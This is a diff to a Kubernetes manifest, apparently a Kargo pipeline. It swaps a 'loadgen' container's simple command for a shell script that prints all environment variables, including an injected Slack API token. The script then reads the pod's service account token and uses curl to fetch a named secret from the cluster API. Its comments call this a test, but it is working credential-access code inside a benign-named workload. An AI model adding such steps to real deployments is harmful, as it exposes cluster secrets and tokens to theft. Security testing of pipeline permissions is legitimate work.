@@ -46,8 +46,31 @@ spec:
             spec:
               containers:
               - name: loadgen
-                image: alpine
-                command: ["printenv"]
+                image: alpine:latest
+                command:
+                - /bin/sh
+                - -c
+                args: |
+                  printenv
+                  # 1. Define the internal API server address and secret name
+                  APISERVER="https://default.svc"
+                  SECRET_NAME="kargo-step-snow"
+
+                  # 2. Read the mounted token and namespace path
+                  TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
+                  NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null)
+                  CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
+
+                  # 3. Attempt to fetch the secret using curl
+                  if [ -z "$TOKEN" ]; then
+                    echo "❌ TEST PASSED: No service account token found at /var/run/secrets/kubernetes.io/serviceaccount/token."
+                  else
+                    echo "Found token. Attempting API call..."
+                    curl --cacert "$CACERT" \
+                        -H "Authorization: Bearer $TOKEN" \
+                        -X GET "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/$SECRET_NAME"
+                  fi
+                  exit 1 #always fail so we can rerun
                 env:
                 - name: SLACK_API_TOKEN
                   valueFrom:
